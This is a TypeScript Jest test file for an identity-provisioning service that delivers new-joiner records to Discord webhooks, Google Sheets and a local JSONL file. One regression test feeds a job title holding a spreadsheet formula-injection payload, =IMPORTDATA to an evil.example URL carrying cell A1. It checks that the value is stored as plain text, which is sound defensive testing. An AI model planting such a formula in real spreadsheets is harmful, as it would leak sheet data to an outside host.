/**
 * Onboarding to the targets that keep no account, through the real activities, services and
 * clients: Discord webhook (axios mocked), Google Sheets (google-spreadsheet stubbed by
 * __mocks__/google-spreadsheet.ts) and File outbound (a real file in a temp directory). Each
 * connector loads its saved config (ConnectorConfigService stubbed). Untested against a live
 * Discord channel or Google Sheet.
 */
import * as fs from 'fs/promises';
import * as os from 'os';
import * as path from 'path';
import axios from 'axios';
// The module google-spreadsheet resolves to in jest (moduleNameMapper), imported for its types
import { GoogleSpreadsheet as StubSpreadsheet } from '../../__mocks__/google-spreadsheet';
import { NoAccountTargetActivities } from './no-account-target.activities';
import { DiscordWebhookService } from '../modules/connectors/discord-webhook-connector/discord-webhook.service';
import { DiscordWebhookClient } from '../modules/connectors/discord-webhook-connector/discord-webhook.client';
import { GoogleSheetsService } from '../modules/connectors/google-sheets-connector/google-sheets.service';
import { GoogleSheetsClient } from '../modules/connectors/google-sheets-connector/google-sheets.client';
import { FileOutboundService } from '../modules/connectors/file-outbound-connector/file-outbound.service';
import type { ConnectorConfigService } from '../modules/connectors/connector-config.service';
import { ConnectorConfigDecryptError } from '../modules/connectors/connector-config.errors';
import type { DomainEventEmitterService } from '@infrastructure/events/event-emitter.service';
import { DomainEventType } from '@infrastructure/events/event-types';
import { EVENT_SCHEMAS } from '@infrastructure/events/event-payload-schemas';
import { fakeHttp, httpError, type FakeHttpCall } from '@testing/fake-http';
import { TEST_TENANT_ID } from '@testing/test-helpers';

jest.mock('axios');

const WEBHOOK_URL = 'https://discord.example/api/webhooks/1/token';
const user = {
  email: 'ada@acme.test',
  firstName: 'Ada',
  lastName: 'Lovelace',
  jobTitle: 'Engineer',
  departmentName: 'R&D',
} as never;
const intent = { operations: [{ target: 'all', type: 'group', action: 'add', targetId: 'eng' }] };
/** The worksheet the google-spreadsheet stub hands out (one shared object). */
const stubSheet = new StubSpreadsheet('any').sheetsByIndex[0];

let tempDir: string;
let configs: Record<string, Record<string, unknown> | undefined>;

function activitiesWith(discordHandler: (call: FakeHttpCall) => unknown = () => undefined) {
  const discord = fakeHttp(discordHandler);
  (axios.create as jest.Mock).mockReturnValue(discord.instance);
  const connectorConfig = {
    getConfig: jest.fn(async (id: string) => (configs[id] ? { config: configs[id] } : null)),
  } as unknown as ConnectorConfigService;
  const emit = jest.fn();
  const activities = new NoAccountTargetActivities(
    new DiscordWebhookService(new DiscordWebhookClient(), connectorConfig),
    new GoogleSheetsService(new GoogleSheetsClient(), connectorConfig),
    new FileOutboundService(connectorConfig),
    { emit } as unknown as DomainEventEmitterService,
  );
  return { activities, discord, connectorConfig, emit };
}

/** The one event of `type` emitted, checked against its payload schema as the emitter does. */
function emitted(emit: jest.Mock, type: DomainEventType) {
  const calls = emit.mock.calls.filter(([t]) => t === type);
  expect(calls).toHaveLength(1);
  const [, aggregateId, payload] = calls[0] as [string, string, Record<string, unknown>];
  expect(EVENT_SCHEMAS[type]!.parse(payload)).toEqual(payload);
  return { aggregateId, payload };
}

const allowedDirBefore = process.env.FILE_OUTBOUND_ALLOWED_DIR;

beforeEach(async () => {
  tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'euroid-no-account-'));
  // File outbound writes only inside its allowed directory (file-outbound.service.ts)
  process.env.FILE_OUTBOUND_ALLOWED_DIR = tempDir;
  configs = {
    'discord-webhook': { webhookUrl: WEBHOOK_URL },
    'google-sheets': {
      sheetId: 'sheet-1',
      serviceAccountJson: JSON.stringify({ client_email: 'sa@test.example', private_key: 'k' }),
    },
    'file-outbound': { outputFilePath: path.join(tempDir, 'joiners.jsonl') },
  };
  stubSheet.addRow.mockClear();
});

afterEach(async () => {
  await fs.rm(tempDir, { recursive: true, force: true });
  if (allowedDirBefore === undefined) delete process.env.FILE_OUTBOUND_ALLOWED_DIR;
  else process.env.FILE_OUTBOUND_ALLOWED_DIR = allowedDirBefore;
});

describe('NoAccountTargetActivities', () => {
  it('File outbound: appends the joiner and the intent as one JSONL line, no account id', async () => {
    const { activities } = activitiesWith();

    const result = await activities.provisionUserToFileOutbound(
      user,
      intent,
      undefined,
      TEST_TENANT_ID,
      'wf-1',
    );

    expect(result).toEqual({
      success: true,
      detail: 'no account: line appended to the outbound file',
    });
    const lines = (await fs.readFile(path.join(tempDir, 'joiners.jsonl'), 'utf8'))
      .trim()
      .split('\n');
    expect(lines).toHaveLength(1);
    expect(JSON.parse(lines[0])).toMatchObject({
      user: { email: 'ada@acme.test', firstName: 'Ada', lastName: 'Lovelace' },
      intent,
    });
  });

  it('File outbound: healthy when the directory is writable; unhealthy when not configured', async () => {
    const { activities } = activitiesWith();
    configs['file-outbound'] = { outputFilePath: path.join(tempDir, 'new-dir', 'out.jsonl') };
    await expect(activities.checkFileOutboundHealth(undefined, TEST_TENANT_ID)).resolves.toBe(true);

    configs['file-outbound'] = undefined;
    await expect(activities.checkFileOutboundHealth(undefined, TEST_TENANT_ID)).resolves.toBe(
      false,
    );
  });

  it('a config this process cannot decrypt fails each health check (retried), never unhealthy', async () => {
    const { activities, discord, connectorConfig } = activitiesWith();
    (connectorConfig.getConfig as jest.Mock).mockImplementation(async (id: string) => {
      throw new ConnectorConfigDecryptError(id);
    });

    for (const check of [
      () => activities.checkDiscordWebhookHealth(undefined, TEST_TENANT_ID),
      () => activities.checkGoogleSheetsHealth(undefined, TEST_TENANT_ID),
      () => activities.checkFileOutboundHealth(undefined, TEST_TENANT_ID),
    ]) {
      await expect(check()).rejects.toBeInstanceOf(ConnectorConfigDecryptError);
    }
    expect(discord.calls).toEqual([]);
  });

  it('Discord webhook: posts the welcome message to the saved webhook, no account id', async () => {
    const { activities, discord } = activitiesWith();

    await expect(
      activities.provisionUserToDiscordWebhook(user, intent, undefined, TEST_TENANT_ID),
    ).resolves.toEqual({ success: true, detail: 'no account: welcome message posted' });
    expect(discord.writes()).toEqual([
      { method: 'POST', url: WEBHOOK_URL, data: { content: expect.stringContaining('Engineer') } },
    ]);
  });

  it('Discord webhook: unhealthy when the webhook is gone (404)', async () => {
    const { activities } = activitiesWith(() => {
      throw httpError(404);
    });
    await expect(activities.checkDiscordWebhookHealth(undefined, TEST_TENANT_ID)).resolves.toBe(
      false,
    );
  });

  it('Discord webhook: a failed post fails the activity with the email masked', async () => {
    const { activities } = activitiesWith(() => {
      throw Object.assign(httpError(500), { message: 'post for ada@acme.test failed' });
    });

    await expect(
      activities.provisionUserToDiscordWebhook(user, intent, undefined, TEST_TENANT_ID),
    ).rejects.toThrow('discord-webhook: post for a•••@acme.test failed');
  });

  it('Google Sheets: appends the joiner row to the saved sheet, no account id', async () => {
    const { activities } = activitiesWith();

    await expect(
      activities.provisionUserToGoogleSheets(user, intent, undefined, TEST_TENANT_ID),
    ).resolves.toEqual({ success: true, detail: 'no account: row appended to the sheet' });
    expect(stubSheet.addRow).toHaveBeenCalledWith(
      expect.objectContaining({ Email: 'ada@acme.test', JobTitle: 'Engineer', Department: 'R&D' }),
      { raw: true },
    );
    await expect(activities.checkGoogleSheetsHealth(undefined, TEST_TENANT_ID)).resolves.toBe(true);
  });

  // Hunt 2026-11-25 (01 F10): addRow defaults to USER_ENTERED, so a name, title or department
  // from an HR feed that starts with "=" (=IMPORTDATA(...)) became a formula in the sheet
  it('Google Sheets: writes the values raw, so a value starting with "=" stays text', async () => {
    const { activities } = activitiesWith();
    const jobTitle = '=IMPORTDATA("https://evil.example/?"&A1)';
    const formula = { ...(user as object), jobTitle } as never;

    await activities.provisionUserToGoogleSheets(formula, intent, undefined, TEST_TENANT_ID);

    expect(stubSheet.addRow).toHaveBeenCalledWith(expect.objectContaining({ JobTitle: jobTitle }), {
      raw: true,
    });
  });

  it('Google Sheets: a missing config fails the provision and the health check', async () => {
    const { activities } = activitiesWith();
    configs['google-sheets'] = undefined;

    await expect(
      activities.provisionUserToGoogleSheets(user, intent, undefined, TEST_TENANT_ID),
    ).rejects.toThrow(/^google-sheets: GoogleSheetsConnector: not configured/);
    await expect(activities.checkGoogleSheetsHealth(undefined, TEST_TENANT_ID)).resolves.toBe(
      false,
    );
    expect(stubSheet.addRow).not.toHaveBeenCalled();
  });

  describe('the identity timeline: provisioning events under the identity id', () => {
    it('reports the delivered record as provisioned, no account and no operation', async () => {
      const { activities, emit } = activitiesWith();

      await activities.provisionUserToFileOutbound(
        { ...(user as object), _id: 'id-1' } as never,
        intent,
        undefined,
        TEST_TENANT_ID,
      );

      const { aggregateId, payload } = emitted(emit, DomainEventType.PROVISIONING_COMPLETED);
      expect(aggregateId).toBe('id-1');
      expect(payload).toEqual({
        identityId: 'id-1',
        connector: 'file-outbound',
        operations: [],
        detail: 'no account: line appended to the outbound file',
        durationMs: expect.any(Number),
      });
    });

    it('reports a failed delivery with its masked reason', async () => {
      const { activities, emit } = activitiesWith(() => {
        throw Object.assign(httpError(500), { message: 'post for ada@acme.test failed' });
      });

      await expect(
        activities.provisionUserToDiscordWebhook(
          { ...(user as object), _id: 'id-1' } as never,
          intent,
          undefined,
          TEST_TENANT_ID,
        ),
      ).rejects.toThrow();

      const { aggregateId, payload } = emitted(emit, DomainEventType.PROVISIONING_FAILED);
      expect(aggregateId).toBe('id-1');
      expect(payload).toEqual({
        identityId: 'id-1',
        connector: 'discord-webhook',
        error: 'discord-webhook: post for a•••@acme.test failed',
        retryable: true,
      });
    });

    it('leaves the identity id out, and puts no email anywhere, for a profile without an id', async () => {
      const { activities, emit } = activitiesWith();

      await activities.provisionUserToGoogleSheets(user, intent, undefined, TEST_TENANT_ID);

      const { aggregateId, payload } = emitted(emit, DomainEventType.PROVISIONING_COMPLETED);
      expect(aggregateId).toBe('google-sheets');
      expect(payload).not.toHaveProperty('identityId');
      expect(JSON.stringify(payload)).not.toContain('@');
    });
  });

  it('requires a tenant and writes nothing without one', async () => {
    const { activities } = activitiesWith();

    await expect(
      activities.provisionUserToFileOutbound(user, intent, undefined, ''),
    ).rejects.toThrow(/tenantId is required/);
    await expect(fs.readdir(tempDir)).resolves.toEqual([]);
  });
});
